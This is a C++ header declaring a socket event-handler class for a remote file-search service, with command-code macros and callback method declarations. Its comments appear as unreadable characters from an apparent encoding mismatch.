#pragma once
#include "EventHandler.h"

#define FILEMGR_SEARCH			('S'|('R'<<8)|('C'<<16)|('H'<<24))

#define FILE_MGR_SEARCH_SEARCH		(0xaca1)

#define FILE_MGR_SEARCH_STOP		(0xaca2)

#define FILE_MGR_SEARCH_FOUND		(0xaca3)

#define FILE_MGR_SEARCH_OVER		(0xaca4)

class CFileMgrSearchDlg;

class CFileMgrSearchSrv :
	public CEventHandler
{
private:
	CFileMgrSearchDlg*	m_pDlg;

public:
	void OnClose();					//��socket�Ͽ���ʱ������������
	void OnConnect();				//��socket���ӵ�ʱ������������
	//�����ݵ����ʱ���������������.
	void OnReadPartial(WORD Event, DWORD Total, DWORD nRead, char*Buffer);
	void OnReadComplete(WORD Event, DWORD Total, DWORD nRead, char*Buffer);
	//�����ݷ�����Ϻ��������������
	void OnWritePartial(WORD Event, DWORD Total, DWORD nWrite, char*Buffer);
	void OnWriteComplete(WORD Event, DWORD Total, DWORD nWrite, char*Buffer);


	void OnFound(char*Buffer);
	void OnOver();

	void Search(WCHAR*szParams);
	void Stop();

	CFileMgrSearchSrv(DWORD dwIdentity);
	~CFileMgrSearchSrv();
};

